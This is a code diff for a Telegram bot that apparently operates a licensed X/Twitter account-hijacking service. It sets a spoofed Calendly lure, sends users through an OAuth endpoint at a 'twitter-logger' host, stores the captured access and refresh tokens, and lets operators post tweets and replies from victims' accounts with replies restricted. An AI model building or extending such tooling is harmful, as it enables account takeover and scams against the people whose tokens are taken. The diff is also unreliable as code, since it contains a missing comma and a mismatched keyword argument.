@@ -169,13 +169,10 @@ async def setup(update: Update, context: CallbackContext) -> None:
             "owner_id": owner_id,
             "owner_username": owner_username,
             "identifier": identifier,
+            "spoof": "https://calendly.com/cointele"
             "redirect": "https://calendly.com/cointele",
             "endpoint": f"https://twitter-logger.onrender.com/oauth?identifier={identifier}",
             "authenticated_users": [],
-            "template": {
-                "name": "calendly",
-                "spoof": "https://calendly.com/cointele"
-            }
         }
         groups.insert_one(group_data)
         
@@ -289,56 +286,41 @@ async def post_tweet(update: Update, context: CallbackContext) -> None:
 
     await handle_generic_error(context, chat_id, res, r)
 
-async def reply(update: Update, context: CallbackContext) -> None:
+
+async def post_reply(update: Update, context: CallbackContext) -> None:
+    chat_id = get_chat_id(update)
+    
     if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
         return
         
     args = context.args
     if len(args) < 3:
         await update.message.reply_text(
-            'Usage: /post_reply {accessToken} {tweetId} {text}')
+            'Usage: /post_reply <username> <id> <message>')
         return
+        
+    group = groups.find_one({"group_id": chat_id})
+    if not group: 
+        text = "⚠️ *An unknown error has occurred\\.*"
+        return await context.bot.send_message(chat_id, text, parse_mode)
 
-    access_token = args[0]
-    tweet_id = args[1]
-    tweet_text = ' '.join(arg.strip()
-                          for arg in args[2:]).replace('\\\\n', '\n')
+    user = next((u for u in group.get('authenticated_users', []) if u['username'].lower() == args[0].lower()), None)
+    if not user:
+        text = f"⚠️ *User _{args[0]}_ has not authorized with OAuth\\.*"
+        return await context.bot.send_message(chat_id, text, parse_mode)
+        
+    message = ' '.join(arg.strip()
+                          for arg in args[2:]).replace('\\n', '\n')
+    access_token, refresh_token, username = user["access_token"], user["refresh_token"], user["username"]
 
-    tweet_url = 'https://api.twitter.com/2/tweets'
-    user_lookup_url = 'https://api.twitter.com/2/users/me'
+    res, r = tweet(access_token, message, tweet_id=args[1])
+    if res.status_code == 201:
+        return await handle_successful_tweet(context, chat_id, username, r, reply=True)
+        
+    if res.status_code == 401:
+        return await handle_token_refresh_and_retry(context, chat_id, user, message, refresh_token, tweet_id=args[1])
 
-    headers = {
-        'Authorization': f'Bearer {access_token}',
-        'Content-Type': 'application/json'
-    }
-
-    response = requests.get(user_lookup_url, headers=headers)
-    response_data = response.json()
-
-    username = response_data['data']['username']
-
-    tweet_data = {
-        'text': tweet_text,
-        'reply': {
-            'in_reply_to_tweet_id': tweet_id,
-        }
-    }
-    response = requests.post(tweet_url, json=tweet_data, headers=headers)
-    response_data = response.json()
-
-    tweetId = response_data['data']['id']
-    chatId = update.message.chat_id if update.message else update.callback_query.message.chat_id
-
-    if response.status_code == 201:
-        await context.bot.send_message(
-            chat_id=chatId,
-            text=
-            f'✅ *Reply Posted* ✅\n\nx.com/{username}/status/{tweetId}\n\n🔑 Access Token:\n`{access_token}`',
-            parse_mode=parse_mode)
-    else:
-        await context.bot.send_message(
-            chat_id=chatId,
-            text=f'🚫 Tweet Failed 🚫\nError: {response_data["title"]}')
+    await handle_generic_error(context, chat_id, res, r)
 
 
 async def delete(update: Update, context: CallbackContext) -> None:
@@ -423,19 +405,22 @@ def get_chat_id(update: Update) -> int:
     return update.message.chat_id if update.message else update.callback_query.message.chat_id
     
     
-def tweet(token: str, message: str) -> tuple:
+def tweet(token: str, message: str, tweet_id=0) -> tuple:
     url = 'https://api.x.com/2/tweets'
-    json = {'text': message, 'reply_settings': "mentionedUsers"}
+    if tweet_id == 0:
+        json = {'text': message, 'reply_settings': "mentionedUsers"}
+    else:
+        json = {'text': message, 'reply_settings': "mentionedUsers", 'reply': {'in_reply_to_tweet_id': tweet_id}}
     headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
     res = requests.post(url=url, json=json, headers=headers)
     return res, res.json()
 
 
-async def handle_successful_tweet(context: CallbackContext, chat_id: int, username: str, response: dict) -> None:
+async def handle_successful_tweet(context: CallbackContext, chat_id: int, username: str, response: dict, is_reply=False) -> None:
     tweet_id = response['data']['id']
     text = f"✅ *Tweet successfully posted by user [{username}](https://x\\.com/{username})\\.*\n" \
         f"🐦 *Tweet ID:* `{tweet_id}`\n" \
-        f"🔗 __*[View tweet](https://x\\.com/{username}/status/{tweet_id})*__\n\n" \
+        f"🔗 __*[View {'reply' if is_reply else 'tweet'}](https://x\\.com/{username}/status/{tweet_id})*__\n\n" \
         f"💬 _Replies for this tweet are restricted to mentioned only\\. To enable replies, use the command */set\\_replies*\\._"
     parse_mode = "MarkdownV2"
     await context.bot.send_message(chat_id, text, parse_mode)
@@ -453,7 +438,7 @@ async def handle_generic_error(context: CallbackContext, chat_id: int, res: requ
     await context.bot.send_message(chat_id, text, parse_mode)
     
     
-async def handle_token_refresh_and_retry(context: CallbackContext, chat_id: int, user: dict, message: str, refresh_token: str) -> None:
+async def handle_token_refresh_and_retry(context: CallbackContext, chat_id: int, user: dict, message: str, refresh_token: str, tweet_id=0) -> None:
     new_access_token, new_refresh_token = await refresh_oauth_tokens(refresh_token)
 
     if not new_access_token:
@@ -468,9 +453,9 @@ async def handle_token_refresh_and_retry(context: CallbackContext, chat_id: int,
         }}
     )
 
-    res, r = tweet(new_access_token, message)
+    res, r = tweet(new_access_token, message, (tweet_id if tweet_id != 0 else 0))
     if res.status_code == 201:
-        await handle_successful_tweet(context, chat_id, user["username"], r)
+        await handle_successful_tweet(context, chat_id, user["username"], r, reply=True)
     else:
         await handle_generic_error(context, chat_id, res, r)
     
@@ -496,7 +481,7 @@ def main() -> None:
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("help", help))
     app.add_handler(CommandHandler("post_tweet", post_tweet))
-    app.add_handler(CommandHandler("post_reply", reply))
+    app.add_handler(CommandHandler("post_reply", post_reply))
     app.add_handler(CommandHandler("setup", setup))
     app.add_handler(CommandHandler("delete_tweet", delete))
     app.add_handler(CommandHandler("generate_key", generate_key))
